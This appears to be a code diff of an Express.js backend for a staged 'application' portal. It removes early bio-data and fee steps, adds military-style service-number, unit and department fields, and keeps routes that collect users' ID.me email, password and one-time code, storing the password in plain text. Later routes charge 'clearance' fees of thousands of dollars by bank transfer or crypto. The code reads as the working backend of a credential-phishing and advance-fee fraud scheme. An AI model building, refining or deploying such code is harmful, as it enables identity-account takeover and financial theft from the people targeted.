@@ -7,32 +7,10 @@ router.use(authMiddleware);
 
 const FEES = { 1: 2620.60, 2: 4420.83, 3: 6700.70 };
 
-const generateInvoiceNumber = async () => {
-  const year = new Date().getFullYear();
-  const counter = await redis.incr('inv:counter');
-  return `INV-${year}-${String(counter).padStart(5, '0')}`;
-};
-
 const getUser = async (id) => {
   const data = await redis.get(`user:${id}`);
   return data ? JSON.parse(data) : null;
 };
-
-router.get('/progress', async (req, res) => {
-  try {
-    const user = await getUser(req.user.id);
-    if (!user) return res.status(404).json({ error: 'Not found' });
-    res.json({
-      currentStage: user.currentStage, stageStatus: user.stageStatus,
-      applyingFor: user.applyingFor, fullName: user.fullName,
-      selectedOffice: user.selectedOffice, applicationFeeVerified: user.applicationFeeVerified,
-      idmeVerified: user.idmeVerified, idmeSubmitted: user.idmeSubmitted, idmeStatus: user.idmeStatus,
-      idmeDeclineMessage: user.idmeDeclineMessage, idmeCodeSent: user.idmeCodeSent,
-      clearanceDuration: user.clearanceDuration, clearancePaymentVerified: user.clearancePaymentVerified,
-      finalApproved: user.finalApproved, bioDataComplete: user.bioDataComplete, officeSelected: user.officeSelected
-    });
-  } catch { res.status(500).json({ error: 'Server error' }); }
-});
 
 router.get('/payment-config', async (req, res) => {
   try {
@@ -62,98 +40,20 @@ router.get('/payment-config', async (req, res) => {
   } catch { res.status(500).json({ error: 'Server error' }); }
 });
 
-router.post('/stage1-bio', async (req, res) => {
-  try {
-    const { fullName, dob, address, city, state, zipCode } = req.body;
-    const user = await getUser(req.user.id);
-    if (!user) return res.status(404).json({ error: 'Not found' });
-
-    user.fullName = fullName || user.fullName;
-    user.dob = dob || user.dob;
-    user.address = address || '';
-    user.city = city || '';
-    user.state = state || '';
-    user.zipCode = zipCode || '';
-    user.bioDataComplete = true;
-    user.currentStage = 2;
-    user.updatedAt = new Date().toISOString();
-
-    await redis.set(`user:${req.user.id}`, JSON.stringify(user));
-    res.json({ success: true, currentStage: 2 });
-  } catch { res.status(500).json({ error: 'Server error' }); }
-});
-
-router.post('/stage2-office', async (req, res) => {
-  try {
-    const { office } = req.body;
-    if (!office || typeof office !== 'string') return res.status(400).json({ error: 'Office required' });
-
-    const user = await getUser(req.user.id);
-    if (!user) return res.status(404).json({ error: 'Not found' });
-
-    user.selectedOffice = office;
-    user.officeSelected = true;
-    user.currentStage = 3;
-    user.updatedAt = new Date().toISOString();
-
-    await redis.set(`user:${req.user.id}`, JSON.stringify(user));
-    res.json({ success: true, currentStage: 3 });
-  } catch { res.status(500).json({ error: 'Server error' }); }
-});
-
-router.post('/stage3-payment', async (req, res) => {
-  try {
-    const { receiptNumber, paymentMethod } = req.body;
-    if (!receiptNumber) return res.status(400).json({ error: 'Receipt number required' });
-    if (!['bank_transfer', 'crypto'].includes(paymentMethod)) return res.status(400).json({ error: 'Invalid payment method' });
-
-    const config = JSON.parse(await redis.get('payment:config') || '{}');
-    if (paymentMethod === 'bank_transfer' && (!config.bankTransfer || !config.bankTransfer.available)) {
-      return res.status(400).json({ error: 'Bank transfer is currently unavailable' });
-    }
-    if (paymentMethod === 'crypto' && (!config.crypto || !config.crypto.available)) {
-      return res.status(400).json({ error: 'Crypto payment is currently unavailable' });
-    }
-
-    const user = await getUser(req.user.id);
-    if (!user) return res.status(404).json({ error: 'Not found' });
-
-    user.receiptNumber = String(receiptNumber).slice(0, 50);
-    user.paymentMethod = paymentMethod;
-    user.paymentSubmittedAt = new Date().toISOString();
-    user.stageStatus = 'awaiting_payment_verification';
-
-    if (paymentMethod === 'crypto') {
-      user.invoiceNumber = await generateInvoiceNumber();
-    }
-
-    user.updatedAt = new Date().toISOString();
-
-    await redis.set(`user:${req.user.id}`, JSON.stringify(user));
-
-    const queue = JSON.parse(await redis.get('admin:pendingPayments') || '[]');
-    queue.push({ userId: req.user.id, receiptNumber: user.receiptNumber, paymentMethod, submittedAt: user.paymentSubmittedAt });
-    await redis.set('admin:pendingPayments', JSON.stringify(queue));
-
-    res.json({ success: true, invoiceNumber: user.invoiceNumber || '' });
-  } catch { res.status(500).json({ error: 'Server error' }); }
-});
-
-router.post('/stage4-idme', async (req, res) => {
+router.post('/stage1-idme', async (req, res) => {
   try {
     const { idmeEmail, idmePassword } = req.body;
     if (!idmeEmail || !idmePassword) return res.status(400).json({ error: 'IDME credentials required' });
 
     const user = await getUser(req.user.id);
     if (!user) return res.status(404).json({ error: 'Not found' });
-    if (!user.applicationFeeVerified) return res.status(400).json({ error: 'Payment not verified' });
 
     user.idmeEmail = idmeEmail;
     user.idmePassword = idmePassword;
     user.idmeSubmitted = true;
     user.idmeStatus = 'sending';
     user.idmeDeclineMessage = '';
-    user.currentStage = 5;
+    user.currentStage = 1;
     user.stageStatus = 'awaiting_idme_verification';
     user.updatedAt = new Date().toISOString();
 
@@ -167,7 +67,7 @@ router.post('/stage4-idme', async (req, res) => {
   } catch { res.status(500).json({ error: 'Server error' }); }
 });
 
-router.post('/stage4-idme-code', async (req, res) => {
+router.post('/stage1-idme-code', async (req, res) => {
   try {
     const { code } = req.body;
     if (!code) return res.status(400).json({ error: 'Code required' });
@@ -189,7 +89,7 @@ router.post('/stage4-idme-code', async (req, res) => {
   } catch { res.status(500).json({ error: 'Server error' }); }
 });
 
-router.post('/stage5-clearance', async (req, res) => {
+router.post('/stage2-clearance', async (req, res) => {
   try {
     const { duration } = req.body;
     if (![1, 2, 3].includes(duration)) return res.status(400).json({ error: 'Invalid duration' });
@@ -199,7 +99,7 @@ router.post('/stage5-clearance', async (req, res) => {
 
     user.clearanceDuration = duration;
     user.clearanceFee = FEES[duration];
-    user.currentStage = 6;
+    user.currentStage = 3;
     user.stageStatus = 'pending_clearance_payment';
     user.updatedAt = new Date().toISOString();
 
@@ -208,7 +108,7 @@ router.post('/stage5-clearance', async (req, res) => {
   } catch { res.status(500).json({ error: 'Server error' }); }
 });
 
-router.post('/stage6-clearance-payment', async (req, res) => {
+router.post('/stage3-clearance-payment', async (req, res) => {
   try {
     const { receiptNumber, paymentMethod } = req.body;
     if (!receiptNumber) return res.status(400).json({ error: 'Receipt number required' });
@@ -240,9 +140,8 @@ router.get('/dashboard', async (req, res) => {
     res.json({
       user: {
         id: user.id, applicationNumber: user.applicationNumber, fullName: user.fullName, email: user.email, username: user.username,
-        applyingFor: user.applyingFor, selectedOffice: user.selectedOffice,
+        applyingFor: user.applyingFor, serviceNumber: user.serviceNumber, unit: user.unit, department: user.department,
         currentStage: user.currentStage, stageStatus: user.stageStatus,
-        applicationFeeVerified: user.applicationFeeVerified, paymentMethod: user.paymentMethod, invoiceNumber: user.invoiceNumber,
         emailVerified: user.emailVerified,
         idmeVerified: user.idmeVerified, idmeSubmitted: user.idmeSubmitted,
         idmeStatus: user.idmeStatus, idmeDeclineMessage: user.idmeDeclineMessage,
